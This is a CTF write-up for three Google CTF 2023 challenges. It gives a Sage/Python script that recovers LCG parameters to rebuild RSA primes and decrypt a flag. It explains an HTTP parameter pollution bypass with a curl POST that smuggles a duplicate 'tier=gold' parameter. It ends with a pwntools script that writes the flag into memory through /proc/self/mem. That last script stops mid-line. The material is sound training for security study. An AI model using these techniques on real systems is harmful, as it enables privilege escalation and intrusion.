---
title: GoogleCTF23
image: assets/writeups/trace3.jpeg
description: Writeups for challenges i solved in googlectf23 
date: 2023-06-23 16:30:00 -3000
categories: [CTFwriteups]
tags: [crypto, pwn, web]
author: trace
---

# Google CTF 23

### Least Common Genominator

Someone used this program to send me an encrypted message but I can't read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but

solve.py

```python
from sage.all import *
from Crypto.PublicKey import RSA
from Crypto.Util.number import *

class LCG:
    def __init__(self, params, seed):
        self.state = seed
        self.lcg_m, self.lcg_c, self.lcg_n = params

    def next(self):
        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
        return self.state

def recover_lcg(out):
    s1, s2, s3, s4, s5, s6, s7 = out

    # recover modulus
    tmp1 = (s3 - s2)**2 - (s4 - s3)*(s2 - s1)
    tmp2 = (s4 - s3)**2 - (s5 - s4)*(s3 - s2)
    tmp3 = (s5 - s4)**2 - (s6 - s5)*(s4 - s3)
    n = gcd([tmp1, tmp2, tmp3])

    # recover m, c
    m, c = matrix(Zmod(n), [
        [s1, 1],
        [s2, 1]
    ]).solve_right(vector(Zmod(n), [s2, s3]))
    
    return LCG(seed=s1, params=[int(m), int(c), int(n)])


# Load dump.txt
seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
dump = [
    2166771675595184069339107365908377157701164485820981409993925279512199123418374034275465590004848135946671454084220731645099286746251308323653144363063385,
    6729272950467625456298454678219613090467254824679318993052294587570153424935267364971827277137521929202783621553421958533761123653824135472378133765236115,
    2230396903302352921484704122705539403201050490164649102182798059926343096511158288867301614648471516723052092761312105117735046752506523136197227936190287,
    4578847787736143756850823407168519112175260092601476810539830792656568747136604250146858111418705054138266193348169239751046779010474924367072989895377792,
    7578332979479086546637469036948482551151240099803812235949997147892871097982293017256475189504447955147399405791875395450814297264039908361472603256921612,
    2550420443270381003007873520763042837493244197616666667768397146110589301602119884836605418664463550865399026934848289084292975494312467018767881691302197
]

if __name__ == '__main__':
    # Load public key
    key = RSA.importKey(open("./public.pem", "r").read())
    N   = key.n
    e   = key.e

    lcg = recover_lcg([seed] + dump)
    primes_arr = []
    primes_n = 1

    while True:
        for i in range(8):
            while True:
                prime_candidate = lcg.next()

                if not isPrime(prime_candidate):
                    continue
                elif prime_candidate.bit_length() != 512:
                    continue
                else:
                    primes_n *= prime_candidate
                    primes_arr.append(prime_candidate)
                    break
        
        # Check bit length
        if primes_n.bit_length() > 4096:
            print("bit length", primes_n.bit_length())
            primes_arr.clear()
            primes_n = 1
            continue
        else:
            break

    # Create public key 'n'
    n = 1
    for j in primes_arr:
        n *= j
    print("[+] Public Key: ", n)
    print("[+] size: ", n.bit_length(), "bits")

    # Calculate totient 'Phi(n)'
    phi = 1
    for k in primes_arr:
        phi *= (k - 1)

    # Calculate private key 'd'
    d = pow(e, -1, phi)

    # Load encrypted flag
    with open ("flag.txt", "rb") as flag_file:
        ct = int.from_bytes(flag_file.read(), "little")
    
    flag = pow(ct, d, n)
    print("Flag: " + long_to_bytes(flag).decode())
```
​
### Under Construction

This challenge is based on two web applications which are running on different tech stacks.

Both applications support registration and login of users. While the registration endpoint of the Flask application can be accessed by anyone, the registration endpoint of the PHP application is protected by a secret token which has to be passed as a HTTP header. This token is shared between the Flask and the PHP application and can not be obtained by an attacker. There is a mechanism that Flask forwards the raw query parameter of registration requests to the PHP application to make sure that all accounts created on the Flask application also exist in the PHP application. Therefore, accounts created with the Flask application can also be used to login with the PHP application.

#### Different user tiers (permission levels)[](https://app.gitbook.com/o/8ttFNj5nsHrHbz87yAiO/s/ewcuSabmp1OdtEhC8sBx/web/google-ctf-23/under-construction#different-user-tiers-permission-levels)

When creating an account, users can select their tier. The Flask application is aware of four different tiers: blue, red, green, gold. While the first three are considered low privileges, the gold tier is considered high privileges. The target for an attacker is to create an account (with known credentials) for the PHP applicatin that is gold tier. If they achieve that, they get the flag.

#### Limiting of gold tier[](https://app.gitbook.com/o/8ttFNj5nsHrHbz87yAiO/s/ewcuSabmp1OdtEhC8sBx/web/google-ctf-23/under-construction#limiting-of-gold-tier) 

The Flask application has a check that makes sure that the account is created on one of the unprivileged tiers. Even though the PHP application is missing such a check, attackers can not directly send authenticated registration requests for accounts in the gold tier to the PHP application because of the secret token in the HTTP header.

#### Bypass and exploit[](https://app.gitbook.com/o/8ttFNj5nsHrHbz87yAiO/s/ewcuSabmp1OdtEhC8sBx/web/google-ctf-23/under-construction#bypass-and-exploit)

An attacker has to send a request to the registration endpoint of the Flask application to create a low-privileged account there (to respect the gold tier permission check in the Flask application) which is then forwarded by Flask to the PHP application and leads to the creation of a high-privileged account in the PHP application (which does not have such a permission check).

This can be achieved by using the fact that the raw HTTP query is forwarded from Flask to PHP and both interpret HTTP queries with repeated parameters differently.

A HTTP query like `a=1&a=2` will be interpreted differently by Flask and PHP running on an Apache HTTP Server. In Flask, the parameter will be `1` (first occurence) while in PHP it will be `2` (last occurence).

This behavior can be used to craft a query like this: `username=username&password=password&tier=blue&tier=gold`. Posting this query to the Flask registration endpoint will lead to the creation of a low-privileged account in Flask and the creation of a high privileged account in PHP. This kind of attack is usually referred to as `HTTP parameter pollution`.

There are lots of tools to execute this POST request in an exploit. One example would be the following curl command:

```bash
curl -X POST http://<flask-challenge>/signup -d "username=username&password=password&tier=blue&tier=gold"
```

### Write Flag Where

Summary: The challenge involves a binary called "chal" that allows users to write data to specific memory addresses. The goal is to write the flag to a chosen address and retrieve it. The binary reads the contents of "/proc/self/maps" and "/flag.txt". It then prompts the user to provide an address and length and writes the flag to that address. By exploiting the program's behaviour, it is possible to write the flag to a specific memory address and retrieve it.

Recon:

- The binary is a 64-bit ELF executable with PIE (Position Independent Executable) enabled.
    

- It dynamically links with libc.so.6 and ld-linux-x86-64.so.2.
    

- The binary does not have stack canaries and has NX (No Execute) enabled.
    

- The RELRO (Relocation Read-Only) protection is set to Partial.
    

- The binary prints "flag.txt not found" and exits if the file is not found.
    

- The program uses various file descriptors to read/write data.
    

**Static Analysis:**

- The main function opens and reads the contents of "/proc/self/maps" and "flag.txt".
    

- It then duplicates file descriptor 1 (stdout) to file descriptor 1337.
    

- It redirects stdin, stdout, and stderr to /dev/null.
    

- An alarm is set for 60 seconds.
    

- Some introductory text and the contents of "/proc/self/maps" are printed using dprintf.
    

- The program enters a while loop where it prompts the user for an address and length.
    

- It reads the user's input and checks if the input was successfully parsed.
    

- It then opens "/proc/self/mem" for writing, sets the file position to the specified address, and writes the contents of the flag to that address.
    

- The loop continues until the input is invalid or the length exceeds 128.
    

- The program exits.
    

**Exploit Strategy:**

- The goal is to write the flag to a specific address and retrieve it.
    

- The program prints the contents of "/proc/self/maps", allowing us to determine the base address.
    

- By calculating the offset of a string in the binary and adding it to the base address, we can determine an address to write the flag.
    

- We need to parse the output of the program and calculate the address dynamically.
    

- Once we have the address, we can provide it as input and retrieve the flag.
    

To solve the challenge, a script is needed to parse the output of the program, calculate the address based on the base address, and interact with the program to write the flag to the desired address. The script will retrieve the flag and complete the challenge. 

**solve.py**

```python
from pwn import *

io = remote('wfw1.2023.ctfcompetition.com',1337)
context.log_level='info'

# Offset to the string in .data sectio which is being printed in while loop
data_string_offset = 0x21e0

# Find the piebase
maps = io.recvuntil(b'/home/user/chal')
maps = maps.split(b'/home/user/chal')[0].split(b'\n')[-1]
piebase = int(maps[:12], 16)
pieend = int(maps[13:-48], 16)

info("Pie base: %#x", piebase)
info("Pie end: %#x", pieend)
io.recvuntil(b'expire\n')

# Send address of label in .data, it will be overwritten with flag
# Then on the next iteration of the loop, it will print
io.sendline(hex(piebase + data_string_offset).encode() + b' 127')

# Spit flag
warning(io.recv().decode
```
